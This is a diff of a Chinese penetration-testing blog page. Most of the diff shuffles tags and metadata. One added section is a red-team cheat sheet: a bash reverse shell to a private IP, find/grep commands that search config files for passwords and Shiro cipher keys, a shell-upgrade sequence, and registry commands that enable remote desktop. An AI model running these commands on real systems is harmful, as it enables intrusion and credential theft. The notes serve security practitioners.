@@ -7,13 +7,13 @@
   <meta name="description" content="Sriracha :)">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta property="og:type" content="website">
-<meta property="og:title" content="Audit">
-<meta property="og:url" content="http://sherlocz.github.io/Audit/index.html">
+<meta property="og:title" content="Python">
+<meta property="og:url" content="http://sherlocz.github.io/Python/index.html">
 <meta property="og:site_name" content="Sriracha :)">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-01-08T08:51:32.000Z">
+<meta property="og:updated_time" content="2019-01-08T08:50:58.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Audit">
+<meta name="twitter:title" content="Python">
 
 
 <link rel="icon" href="/img/avatar.jpg">
@@ -149,7 +149,7 @@
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color5">JAVA</a>
+        <a class="color3">钓鱼</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -157,7 +157,7 @@
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color3">钓鱼</a>
+        <a class="color5">JAVA</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -165,11 +165,11 @@
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color3">汇编</a>
+        <a class="color5">内网渗透</a>
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color5">内网渗透</a>
+        <a class="color3">汇编</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -213,6 +213,10 @@
     </li>
     
     <li class="article-tag-list-item">
+        <a class="color5">CS插件</a>
+    </li>
+    
+    <li class="article-tag-list-item">
         <a class="color3">工具</a>
     </li>
     
@@ -221,19 +225,15 @@
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color5">CS插件</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a class="color5">环境搭建</a>
-    </li>
-    
-    <li class="article-tag-list-item">
         <a class="color4">exchange</a>
     </li>
     
     <li class="article-tag-list-item">
         <a class="color5">信息收集</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">环境搭建</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -289,11 +289,11 @@
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color5">应急响应</a>
+        <a class="color3">译文</a>
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color3">译文</a>
+        <a class="color5">应急响应</a>
     </li>
     
     <div class="clearfix"></div>
@@ -1178,7 +1178,39 @@
     }
 </style>
 </div>
-            <p>开启3389</p>
+            <p>Linux一句话反弹</p>
+<pre><code>bash -i &gt;&amp; /dev/tcp/192.168.1.123/12345 0&gt;&amp;1
+</code></pre><p>Linux敏感文件搜索</p>
+<pre><code>find / -name *.properties 2&gt;/dev/null | grep WEB-INF
+find / -name &quot;*.properties&quot; | xargs egrep -i &quot;user|pass|pwd|uname|login|db_&quot; find / -regex &quot;.*\.properties\|.*\.conf\|.*\.config&quot; | xargs grep -E &quot;=jdbc:|pass=&quot;
+
+find /webapp -regex &quot;.*\.properties&quot; -print 2&gt;/dev/null | xargs grep -E &quot;=jdbc:|rsync&quot;
+
+find / -regex &quot;.*\.properties&quot; -print  2&gt;/dev/null
+find / -regex &quot;.*\.properties\|.*\.conf\|.*\.config\|.*\.sh&quot; | xargs grep -E &quot;=jdbc:|pass=|passwd=&quot;
+grep -r &apos;setCipherKey(Base64.decode(&apos; /web路径
+find / -regex &quot;.*\.xml\|.*\.properties\|.*\.conf\|.*\.config\|.*\.jsp&quot; | xargs grep -E &quot;setCipherKey&quot;
+</code></pre><p>Linux保存shell</p>
+<pre><code>#创建新的会话
+tmux new -s ccc
+#查看会话
+tmux ls
+#进入会话
+tmux a -t ccc
+#删除会话
+tmux kill-session -t ccc
+</code></pre><p>Linux建立交互shell</p>
+<pre><code>
+# 在反向shell内通过python一句话fork个bash
+python -c &apos;import pty; pty.spawn(&quot;/bin/bash&quot;)&apos;
+
+#挂起反向shell #本步骤基本实现普通交互shell
+Ctrl-Z
+echo $TERM    #记录$term变量 #xterm
+stty -a      #记录stty配置 #可忽略 #rows 39; columns 153; 
+stty raw -echo 
+fg        #通过fg取回挂起的nc #fg不输出 #运行后回车乱码显示
+</code></pre><p>开启3389</p>
 <pre><code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
 </code></pre><p>查看远程桌面端口：</p>
 <pre><code>reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber
@@ -1305,7 +1337,7 @@ misc::memssp
     /*作者、标签的自动补全*/
     $(function () {
         $('.search').AutoComplete({
-            'data': ['#爬虫','#JAVA','#漏洞复现','#钓鱼','#反汇编','#汇编','#内网渗透','#实战','#提权','#注入','#主机漏洞','#免杀','#协议','#甲方安全','#代码审计','#权限维持','#Python','#工具','#CobaltStrike','#CS插件','#环境搭建','#exchange','#信息收集','#Mimikatz','#域渗透','#bypass','#密码抓取','#批量','#CSharp','#Sqlmap','#汇总','#后渗透','#msf','#disable_function','#逆向','#思考','#应急响应','#译文',],
+            'data': ['#爬虫','#钓鱼','#漏洞复现','#JAVA','#反汇编','#内网渗透','#汇编','#实战','#提权','#注入','#主机漏洞','#免杀','#协议','#甲方安全','#代码审计','#权限维持','#Python','#CS插件','#工具','#CobaltStrike','#exchange','#信息收集','#环境搭建','#Mimikatz','#域渗透','#bypass','#密码抓取','#批量','#CSharp','#Sqlmap','#汇总','#后渗透','#msf','#disable_function','#逆向','#思考','#译文','#应急响应',],
             'itemHeight': 20,
             'width': 418
         }).AutoComplete('show');
